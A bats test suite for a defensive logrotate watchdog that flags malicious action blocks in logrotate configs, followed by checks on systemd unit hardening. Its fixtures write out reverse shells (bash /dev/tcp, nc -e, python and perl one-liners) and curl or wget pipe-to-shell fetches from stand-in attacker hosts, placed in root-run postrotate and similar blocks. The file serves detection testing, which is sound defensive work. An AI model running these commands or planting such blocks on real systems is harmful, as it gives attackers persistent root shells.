#!/usr/bin/env bats
# L2 bats functional tests for the logrotate-watchdog scan script.
#
# logrotate runs the prerotate/postrotate/firstaction/lastaction script
# blocks in /etc/logrotate.conf and /etc/logrotate.d/* AS ROOT on each
# (typically daily) rotation — a planted action block is recurring root-exec
# persistence (T1546). A logrotate file that is world-writable / non-root-
# owned, or contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-logrotate-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd/logrotate-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/logrotate.conf"
}

teardown() { rm -rf "${TMP}"; }

# D pointed at a nonexistent dir so the test is isolated to the main conf.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_LOGROTATE_PROFILE="${PROFILE:-report}" \
    SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
    SELFDEF_LOGROTATE_FILE="${CONF_V:-$CONF}" \
    SELFDEF_LOGROTATE_D="${TMP}/no-logrotate-d" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '/var/log/nginx/*.log {\n  weekly\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
}

@test "no logrotate config → ok / no_logrotate" {
    CONF_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_logrotate"'
    cap | grep -q '"severity":"ok"'
}

@test "benign logrotate conf, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged logrotate conf on second run → ok / logrotate_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in a postrotate block → alert / logrotate_suspicious" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"logrotate_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable logrotate conf → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign logrotate change → warn / logrotate_changed" {
    seed_benign
    run_wd
    printf '/var/log/nginx/*.log {\n  daily\n  postrotate\n    /usr/bin/systemctl reload nginx\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"logrotate_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign postrotate using systemctl is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious postrotate block" {
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    curl http://evil/p|sh\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — logrotate inventory enumerates root-exec-on-rotation surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in postrotate → alert" {
    seed_benign
    run_wd
    printf '/var/log/y.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in prerotate → alert" {
    seed_benign
    run_wd
    printf '/var/log/z.log {\n  prerotate\n    wget -qO- http://attacker/p | sh\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in firstaction → alert" {
    seed_benign
    run_wd
    printf '/var/log/q.log {\n  firstaction\n    echo YmFzaCAtaQ== | base64 -d | bash\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable logrotate conf): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable logrotate conf): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-logrotate -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): logrotate-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 recurring root-exec persistence — alert must persist.
    seed_benign
    run_wd
    printf '/var/log/x.log {\n  postrotate\n    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n  endscript\n}\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"logrotate_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/nginx/*.log {
  weekly
  postrotate
    # future: bash -i >& /dev/tcp/evil/4444 0>&1
    /usr/bin/systemctl reload nginx
  endscript
}
EOF
    run_wd
    ! cap | grep -q '"event":"logrotate_suspicious"'
}

@test "INVARIANT (logrotate.d drop-in axis: injection in /etc/logrotate.d/*.conf → alert; not only main /etc/logrotate.conf)" {
    # Attackers may plant injection in /etc/logrotate.d/00-evil.conf
    # to avoid touching main /etc/logrotate.conf. Watchdog must
    # walk logrotate.d/ too.
    LOGROTATED="${TMP}/logrotate.d"
    mkdir -p "${LOGROTATED}"
    seed_benign
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${LOGROTATED}/00-evil" <<'EOF'
/var/log/evil.log {
  postrotate
    curl -s http://attacker.com/p | bash
  endscript
}
EOF
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (lastaction block also scanned — not just postrotate+prerotate+firstaction)" {
    # logrotate has 4 action block types: prerotate/postrotate/
    # firstaction/lastaction. The pre-existing tests cover the
    # first 3. Lock lastaction coverage too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/x.log {
  weekly
  lastaction
    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1
  endscript
}
EOF
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in postrotate block: netcat-listening pipe also detected)" {
    # Sister to sshrc/csh-config nc reverse-shell variant INVARIANTs.
    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are a
    # canonical RCE primitive. Lock detection in logrotate action
    # blocks too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/x.log {
  postrotate
    nc -e /bin/sh 1.1.1.1 4444
  endscript
}
EOF
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (sample names offending logrotate file in JSON — operator triage routing)" {
    # When injection-pattern alert fires, sample MUST surface the
    # file path so operator dashboard routes triage. Sister
    # contract: many other watchdogs' sample-naming pattern.
    LOGROTATED="${TMP}/logrotate.d"
    mkdir -p "${LOGROTATED}"
    seed_benign
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${LOGROTATED}/99-very-distinctive-attacker" <<'EOF'
/var/log/evil.log {
  postrotate
    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1
  endscript
}
EOF
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    cap | grep -q 'very-distinctive-attacker'
}

@test "INVARIANT (multi-file scan: a second logrotate.d drop-in alongside benign one → still alerts; per-file scope holds)" {
    # Sister to many other multi-file scan INVARIANTs. Attackers may
    # layer multiple files in logrotate.d/; each must be enumerated.
    LOGROTATED="${TMP}/logrotate.d"
    mkdir -p "${LOGROTATED}"
    seed_benign
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Two drop-ins: benign + evil.
    cat > "${LOGROTATED}/01-benign" <<'EOF'
/var/log/app1.log {
  weekly
  postrotate
    /bin/systemctl reload app1
  endscript
}
EOF
    cat > "${LOGROTATED}/02-evil" <<'EOF'
/var/log/app2.log {
  postrotate
    curl http://attacker/p | bash
  endscript
}
EOF
    PATH="${BIN}:${PATH}" \
        SELFDEF_MODULE_LIB="${LIB}" \
        SELFDEF_LOGROTATE_PROFILE=report \
        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
        SELFDEF_LOGROTATE_FILE="${CONF}" \
        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
        bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on logrotate postrotate surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the logrotate-
    # rotation-trigger root-exec persistence surface (T1546 —
    # logrotate runs postrotate scripts AS ROOT on every rotation
    # cycle — recurring trigger fired by daily/weekly/monthly
    # operator-routine maintenance).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/app.log {
  daily
  postrotate
    python -c "import socket,os,pty;s=socket.socket();s.connect(('1.1.1.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')"
  endscript
}
EOF
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on logrotate postrotate surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp logrotate
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency. Locks perl axis on
    # T1546 logrotate-rotation-trigger root-exec persistence —
    # postrotate runs AS ROOT on every rotation cycle, planted
    # perl rev-shell fires daily/weekly/monthly.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/app.log {
  daily
  postrotate
    perl -e "use Socket;\$i=\"1.1.1.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));exec(\"/bin/sh -i\");"
  endscript
}
EOF
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOF'
/var/log/app1.log {
  daily
  postrotate
    /tmp/.evil1
  endscript
}
/var/log/app2.log {
  daily
  postrotate
    /var/tmp/.evil2
  endscript
}
EOF
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-logrotate -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (exec-path under writable-root: postrotate invoking binary from /dev/shm → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # log-rotation-trigger root-exec — postrotate fires AS ROOT
    # on every log rotation (typically daily; logrotate cron).
    # /dev/shm tmpfs in-RAM: no on-disk forensic trace.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    cat > "${CONF}" <<'EOC'
/var/log/app.log {
  daily
  postrotate
    /dev/shm/staged_payload
  endscript
}
EOC
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on logrotate surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The logrotate-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 log-rotation-trigger root-exec
    # persistence alert. Locks parser contract on the
    # logrotate.d postrotate/prerotate/firstaction/lastaction
    # detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    cat > "${CONF}" <<'EOC'
/var/log/app.log {
  daily
  postrotate
    /tmp/.evil
  endscript
}
EOC
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # logrotate-watchdog runs ON the timer's scheduled fire —
    # scans /etc/logrotate.d/* for postrotate-block injection
    # patterns, emits a verdict, then exits. Type=simple would
    # break timer OnUnitActiveSec semantics. Locks oneshot-
    # probe contract on the logrotate-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd/selfdef-logrotate.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. logrotate-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # logrotate-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # logrotate-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'logrotate-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: logrotate-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. logrotate-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the logrotate-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (logrotate-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the logrotate-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # logrotate-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # logrotate-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the logrotate-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # logrotate-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the logrotate-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (logrotate-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the logrotate-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the logrotate-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the logrotate-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the logrotate-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/logrotate-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (logrotate-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
